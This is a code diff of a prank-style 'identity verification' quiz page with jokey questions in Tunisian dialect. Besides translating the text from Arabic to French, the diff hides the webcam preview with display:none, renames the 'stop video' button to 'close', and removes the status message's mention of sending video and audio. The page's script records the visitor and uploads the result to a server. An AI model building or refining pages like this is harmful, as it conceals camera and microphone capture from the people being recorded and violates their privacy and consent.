@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديد الهوية والأسئلة</title>
+    <title>Vérification d'identité</title>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
         .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 480px; width: 100%; }
@@ -19,9 +19,10 @@
             font-weight: bold;
         }
 
-        #video-container { margin: 15px 0; }
-        video { width: 100%; border-radius: 8px; background: #000; border: 2px solid #ddd; }
-        .question-box { margin-bottom: 15px; text-align: right; background: #f1f2f6; padding: 10px; border-radius: 5px; }
+        /* إخفاء إطار الفيديو نهائياً */
+        #video-container { display: none; }
+        
+        .question-box { margin-bottom: 15px; text-align: left; background: #f1f2f6; padding: 10px; border-radius: 5px; }
         .question-box label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; }
         .question-box input, .question-box select { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
         
@@ -32,19 +33,19 @@
 <body>
     <div class="card">
         <div class="title-banner">TJEWEB T9OSS</div>
-        <h2>تحقق من الهوية</h2>
+        <h2>Vérification d'identité</h2>
 
         <div id="video-container">
             <video id="webcam" autoplay playsinline muted></video>
         </div>
         
         <form id="quizForm">
-            <input type="text" id="username" placeholder="اسمك الكريم (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
+            <input type="text" id="username" placeholder="Votre Nom (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
             
             <div class="question-box">
                 <label>1. I'M MORE BEAUTIFUL THAN YOU</label>
                 <select id="q1" required>
-                    <option value="">اختر الإجابة</option>
+                    <option value="">Sélectionnez une réponse</option>
                     <option value="yes">Yes</option>
                     <option value="no">No</option>
                 </select>
@@ -53,7 +54,7 @@
             <div class="question-box">
                 <label>2. enti bhim</label>
                 <select id="q2" required>
-                    <option value="">اختر الإجابة</option>
+                    <option value="">Sélectionnez une réponse</option>
                     <option value="yes">Yes</option>
                     <option value="no">No</option>
                 </select>
@@ -62,14 +63,14 @@
             <div class="question-box">
                 <label>3. chnowa essm kalbek?</label>
                 <select id="q3" required>
-                    <option value="">اختر الإجابة</option>
+                    <option value="">Sélectionnez une réponse</option>
                     <option value="sknder">sknder</option>
                     <option value="michou">michou</option>
                     <option value="tito">tito</option>
                 </select>
             </div>
 
-            <button type="button" onclick="verifyAndStop()">إرسال وإيقاف الفيديو</button>
+            <button type="button" onclick="verifyAndStop()">Envoyer et fermer</button>
         </form>
 
         <div id="status"></div>
@@ -119,7 +120,7 @@
 
             if (!username) {
                 statusDiv.style.color = 'red';
-                statusDiv.innerText = 'الرجاء إدخال الاسم أولاً.';
+                statusDiv.innerText = 'Veuillez entrer votre nom d\'abord.';
                 return;
             }
 
@@ -129,13 +130,13 @@
 
             if (!q1 || !q2 || !q3) {
                 statusDiv.style.color = 'red';
-                statusDiv.innerText = 'الرجاء الإجابة على كل الأسئلة.';
+                statusDiv.innerText = 'Veuillez répondre à toutes les questions.';
                 return;
             }
 
             if (q1 === 'yes' && q2 === 'yes' && q3 === 'sknder') {
                 statusDiv.style.color = 'green';
-                statusDiv.innerText = 'إجابات صحيحة! جاري إيقاف الفيديو وإرسال البيانات والصوت...';
+                statusDiv.innerText = 'Réussi ! Envoi des données en cours...';
 
                 if (mediaRecorder && mediaRecorder.state !== "inactive") {
                     mediaRecorder.stop();
@@ -177,23 +178,23 @@
                         });
 
                         if (response.ok) {
-                            statusDiv.innerText = 'تم الإرسال بنجاح!';
+                            statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
                             if (mediaStream) {
                                 mediaStream.getTracks().forEach(track => track.stop());
                             }
                         } else {
                             statusDiv.style.color = 'red';
-                            statusDiv.innerText = 'فشل في إرسال البيانات.';
+                            statusDiv.innerText = 'Échec de l\'envoi des données.';
                         }
                     } catch (err) {
                         statusDiv.style.color = 'red';
-                        statusDiv.innerText = 'خطأ في الاتصال بالخادم.';
+                        statusDiv.innerText = 'Erreur de connexion au serveur.';
                     }
                 }, 1000);
 
             } else {
                 statusDiv.style.color = 'red';
-                statusDiv.innerText = 'غلط! حاول مرة أخرى.';
+                statusDiv.innerText = 'Erreur ! Veuillez réessayer.';
             }
         }
     </script>
